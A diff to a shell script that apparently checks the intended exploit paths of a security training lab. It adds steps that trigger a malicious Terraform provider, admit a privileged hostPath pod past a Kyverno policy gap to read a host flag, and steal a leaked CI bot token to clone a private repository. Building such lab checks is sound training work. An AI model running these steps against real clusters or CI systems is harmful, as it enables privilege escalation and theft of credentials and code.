@@ -270,6 +270,69 @@ EOF
   chk k8s_4 k8s_4-argocd-weak-admin "$out"
 fi
 
+echo "### IaC / policy / access-control kill-chains ###"
+
+# --- tf_1: malicious provider via .terraformrc redirect -> provider binary runs on plan ----
+if enabled tf_1; then
+  out=$(rsx atlantis deployer <<'EOF'
+cd /home/deployer; rm -rf pt1; mkdir pt1; cd pt1
+cat > main.tf <<'TF'
+terraform {
+  required_providers { null = { source = "hashicorp/null" } }
+}
+resource "null_resource" "x" {}
+TF
+rm -f /tmp/tf1-proof
+/usr/local/bin/terraform plan -no-color >/dev/null 2>&1 || true
+cat /tmp/tf1-proof 2>/dev/null
+EOF
+)
+  chk tf_1 tf_1-malicious-provider "$out"
+fi
+
+# --- pol_3: Kyverno namespace-exclusion gap admits a privileged hostPath pod -> node flag ----
+if enabled pol_3; then
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+k3s kubectl -n alpha delete pod pol3 --ignore-not-found >/dev/null 2>&1
+cat <<'POD' | k3s kubectl apply -f - >/dev/null 2>&1
+apiVersion: v1
+kind: Pod
+metadata: { name: pol3, namespace: alpha }
+spec:
+  restartPolicy: Never
+  containers:
+  - name: x
+    image: busybox:1.36
+    securityContext: { privileged: true }
+    command: ["sh","-c","cat /host/pol3-flag.txt"]
+    volumeMounts: [{ name: h, mountPath: /host }]
+  volumes:
+  - name: h
+    hostPath: { path: /opt/minilab2 }
+POD
+for i in $(seq 1 30); do
+  ph=$(k3s kubectl -n alpha get pod pol3 -o jsonpath='{.status.phase}' 2>/dev/null)
+  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
+done
+sleep 2
+k3s kubectl -n alpha logs pol3 2>/dev/null
+EOF
+)
+  chk pol_3 pol_3-kyverno-admission-bypass "$out"
+fi
+
+# --- pbac_4: over-scoped CI bot token leaked on the runner -> clone another team's private repo ----
+if enabled pbac_4; then
+  tok=$(on runner "sed -n 's/GITEA_BOT_TOKEN=//p' /opt/ci-bot.env 2>/dev/null")
+  if [ -n "$tok" ]; then
+    W=$(mktemp -d)
+    git clone -q "http://ci-bot:$tok@gitea:3000/platform/secrets.git" "$W/s" 2>/dev/null
+    out=$(cat "$W/s/CROWN.md" 2>/dev/null); rm -rf "$W"
+    chk pbac_4 pbac_4-overscoped-token "$out"
+  else no pbac_4 "no leaked token on runner"; fi
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
